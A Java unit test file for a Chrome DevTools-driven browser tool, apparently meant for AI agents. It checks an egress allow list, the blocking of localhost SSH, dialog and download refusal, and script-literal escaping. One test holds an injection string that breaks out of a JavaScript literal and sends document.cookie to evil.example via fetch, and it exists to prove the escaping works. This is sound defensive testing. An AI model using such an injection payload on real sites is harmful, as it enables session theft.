package io.github.llm4j.tools.browser;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import io.github.llm4j.tools.EgressProxy;
import io.github.llm4j.tools.ToolRefusal;
import java.io.IOException;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.function.BiFunction;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * The real backend's decisions without a browser: a scripted channel answers its commands and the
 * test plays the browser's events, so every request it pauses is seen being let through or failed.
 */
class CdpBrowserLogicTest {

    static final ObjectMapper JSON = new ObjectMapper();
    @TempDir Path dir;

    /** Answers by method; records every command. */
    static final class Script implements Channel {
        final List<String> calls = new ArrayList<>();
        final List<JsonNode> posts = new ArrayList<>();
        BiFunction<String, ObjectNode, JsonNode> answer = (m, p) -> JSON.createObjectNode();
        Runnable onNavigate = () -> {};
        boolean closed;

        public JsonNode call(String method, ObjectNode params, String session, Duration timeout) throws IOException {
            calls.add(method);
            if (method.equals("Page.navigate")) onNavigate.run();
            JsonNode a = answer.apply(method, params);
            if (a == null) throw new IOException(method + " failed");
            return a;
        }

        public void post(String method, ObjectNode params, String session) {
            ObjectNode m = JSON.createObjectNode().put("method", method);
            m.set("params", params);
            posts.add(m);
        }

        public void close() {
            closed = true;
        }
    }

    static JsonNode value(Object v) {
        ObjectNode r = JSON.createObjectNode();
        r.set("result", JSON.createObjectNode().set("value", JSON.valueToTree(v)));
        return r;
    }

    final Script script = new Script();
    final RequestGate gate = new RequestGate(EgressProxy.Hosts.parse("example.com"), h -> List.of(InetAddress.getByName("93.184.215.14")), p -> p == 41000);

    CdpBrowser browser(int maxRequests) throws Exception {
        Path profile = Files.createDirectories(dir.resolve("profile"));
        CdpBrowser b = new CdpBrowser(gate, maxRequests, null, null, script, "S1", profile);
        b.guard();
        return b;
    }

    static JsonNode event(String json) throws Exception {
        return JSON.readTree(json);
    }

    @Test
    void theTabIsGuardedBeforeAnyPageLoads() throws Exception {
        browser(10);
        assertThat(script.calls).containsSubsequence("Fetch.enable", "Network.enable", "Page.enable", "Runtime.enable", "Page.setInterceptFileChooserDialog");
    }

    @Test
    void everyPausedRequestIsLetThroughOrFailedByTheGate() throws Exception {
        CdpBrowser b = browser(2);
        b.event("Fetch.requestPaused", event("{\"requestId\":\"1\",\"request\":{\"url\":\"https://example.com/a.css\"}}"));
        b.event("Fetch.requestPaused", event("{\"requestId\":\"2\",\"request\":{\"url\":\"https://evil.example/x\"}}"));
        b.event("Fetch.requestPaused", event("{\"requestId\":\"3\",\"request\":{\"url\":\"http://127.0.0.1:22/\"}}"));
        b.event("Fetch.requestPaused", event("{\"requestId\":\"4\",\"request\":{\"url\":\"http://127.0.0.1:41000/app\"}}"));
        b.event("Fetch.requestPaused", event("{\"requestId\":\"5\",\"request\":{\"url\":\"https://example.com/third\"}}"));
        assertThat(script.posts).extracting(p -> p.get("method").asText() + " " + p.path("params").path("requestId").asText())
                .containsExactly("Fetch.continueRequest 1", "Fetch.failRequest 2", "Fetch.failRequest 3", "Fetch.continueRequest 4", "Fetch.failRequest 5");
        assertThat(script.posts.get(1).path("params").path("errorReason").asText()).isEqualTo("BlockedByClient");
        assertThat(b.failedRequests()).extracting(BrowserBackend.Failed::reason)
                .anyMatch(r -> r.contains("not in this tool's hosts"))
                .anyMatch(r -> r.contains("port 22"))
                .anyMatch(r -> r.contains("max_requests (2)"));
    }

    @Test
    void networkFailuresAreListedButNotTwiceForWhatTheGateRefused() throws Exception {
        CdpBrowser b = browser(10);
        b.event("Network.requestWillBeSent", event("{\"requestId\":\"7\",\"request\":{\"url\":\"https://example.com/gone\"}}"));
        b.event("Network.loadingFailed", event("{\"requestId\":\"7\",\"errorText\":\"net::ERR_NAME_NOT_RESOLVED\"}"));
        b.event("Fetch.requestPaused", event("{\"requestId\":\"8\",\"request\":{\"url\":\"https://evil.example/x\"}}"));
        b.event("Network.requestWillBeSent", event("{\"requestId\":\"8\",\"request\":{\"url\":\"https://evil.example/x\"}}"));
        b.event("Network.loadingFailed", event("{\"requestId\":\"8\",\"errorText\":\"net::ERR_BLOCKED_BY_CLIENT\"}"));
        b.event("Network.loadingFailed", event("{\"requestId\":\"9\",\"errorText\":\"net::ERR_ABORTED\"}"));
        assertThat(b.failedRequests()).extracting(BrowserBackend.Failed::url).containsExactly("https://example.com/gone", "https://evil.example/x");
    }

    @Test
    void dialogsAreDismissedAndPickersDownloadsAndConsoleAreRecorded() throws Exception {
        CdpBrowser b = browser(10);
        b.event("Page.javascriptDialogOpening", event("{\"type\":\"alert\",\"message\":\"you won\"}"));
        b.event("Page.fileChooserOpened", event("{}"));
        b.event("Browser.downloadWillBegin", event("{\"url\":\"https://example.com/setup.exe\"}"));
        b.event("Runtime.consoleAPICalled", event("{\"type\":\"log\",\"args\":[{\"value\":\"hello\"},{\"description\":\"Object\"}]}"));
        b.event("Runtime.exceptionThrown", event("{\"exceptionDetails\":{\"text\":\"Uncaught boom\"}}"));
        b.event("Something.else", event("{}"));
        assertThat(script.posts).extracting(p -> p.get("method").asText()).contains("Page.handleJavaScriptDialog");
        assertThat(script.posts.get(0).path("params").path("accept").asBoolean()).isFalse();
        assertThat(b.refused()).containsExactly("dialog dismissed: alert you won", "file picker refused", "download refused: https://example.com/setup.exe");
        assertThat(b.console()).containsExactly("log: hello Object", "error: Uncaught boom");
    }

    @Test
    void openWaitsForTheLoadAndReadsWhereItLanded() throws Exception {
        CdpBrowser b = browser(10);
        script.onNavigate = () -> {
            try {
                b.event("Network.responseReceived", event("{\"type\":\"Document\",\"response\":{\"status\":200}}"));
                b.event("Network.responseReceived", event("{\"type\":\"Document\",\"response\":{\"status\":404}}"));
                b.event("Page.loadEventFired", event("{}"));
            } catch (Exception e) {
                throw new IllegalStateException(e);
            }
        };
        script.answer = (m, p) -> switch (m) {
            case "Runtime.evaluate" -> {
                String e = p.get("expression").asText();
                yield value(e.equals("location.href") ? "https://example.com/home" : e.equals("document.title") ? "Home" : "Body text");
            }
            default -> JSON.createObjectNode();
        };
        BrowserBackend.Page page = b.open("https://example.com/", Duration.ofSeconds(2));
        assertThat(page).isEqualTo(new BrowserBackend.Page("https://example.com/home", "Home", 200));
        assertThat(b.text(4)).isEqualTo("Body");
        assertThat(b.text(100)).isEqualTo("Body text");
    }

    @Test
    void aPageThatDoesNotLoadOrCannotBeReachedIsSaid() throws Exception {
        CdpBrowser b = browser(10);
        assertThatThrownBy(() -> b.open("https://example.com/", Duration.ofMillis(50))).isInstanceOf(ToolRefusal.class).hasMessageContaining("did not finish loading");
        script.answer = (m, p) -> m.equals("Page.navigate") ? JSON.createObjectNode().put("errorText", "net::ERR_CONNECTION_REFUSED") : JSON.createObjectNode();
        assertThatThrownBy(() -> b.open("https://example.com/", Duration.ofSeconds(1))).hasMessageContaining("ERR_CONNECTION_REFUSED");
        script.answer = (m, p) -> {
            ObjectNode r = JSON.createObjectNode();
            r.set("exceptionDetails", JSON.createObjectNode().put("text", "TypeError"));
            return r;
        };
        assertThatThrownBy(() -> b.text(10)).hasMessageContaining("TypeError");
    }

    @Test
    void elementsAreFoundByLiteralsNeverByScriptTheModelWrote() throws Exception {
        CdpBrowser b = browser(10);
        List<String> scripts = new ArrayList<>();
        script.answer = (m, p) -> {
            if (m.equals("Runtime.evaluate")) {
                scripts.add(p.get("expression").asText());
                return value(true);
            }
            return m.equals("Page.captureScreenshot") ? JSON.createObjectNode().put("data", Base64.getEncoder().encodeToString(new byte[] {1, 2})) : JSON.createObjectNode();
        };
        String hostile = "x'); fetch('https://evil.example/'+document.cookie); ('";
        assertThat(b.click(new BrowserBackend.Target(null, hostile))).isTrue();
        assertThat(b.fill(new BrowserBackend.Target("#q", null), "</script>\u2028" + hostile)).isTrue();
        assertThat(b.waitFor(new BrowserBackend.Target(null, "Done"), Duration.ofSeconds(1))).isTrue();
        assertThat(b.waitFor(new BrowserBackend.Target("#x", null), Duration.ofSeconds(1))).isTrue();
        assertThat(scripts.get(0)).contains(JSON.writeValueAsString(hostile));
        assertThat(scripts.get(1)).contains("<\\/script>").contains("\\u2028").doesNotContain("\u2028");
        assertThat(b.screenshot()).containsExactly(1, 2);
        script.answer = (m, p) -> value(false);
        assertThat(b.waitFor(new BrowserBackend.Target("#never", null), Duration.ofMillis(150))).isFalse();
    }

    @Test
    void closeStopsEverythingOnceAndRemovesTheProfile() throws Exception {
        CdpBrowser b = browser(10);
        script.answer = (m, p) -> m.equals("Browser.close") ? null : JSON.createObjectNode();
        b.close();
        b.close();
        assertThat(script.closed).isTrue();
        assertThat(script.calls.stream().filter("Browser.close"::equals)).hasSize(1);
        assertThat(dir.resolve("profile")).doesNotExist();
    }

    @Test
    void noBrowserOnThePathIsNull() {
        assertThat(CdpBrowser.NAMES).contains("chromium", "google-chrome");
        Path found = CdpBrowser.onPath();
        assertThat(found == null || Files.isExecutable(found)).isTrue();
    }

    @Test
    void literalsAreSafeForAScript() {
        assertThat(Limit.json(null)).isEqualTo("null");
        assertThat(Limit.json("a\"b")).isEqualTo("\"a\\\"b\"");
        assertThat(Limit.cut("abcdef", 3)).isEqualTo("abc…");
        assertThat(Limit.cut("ab", 3)).isEqualTo("ab");
    }
}
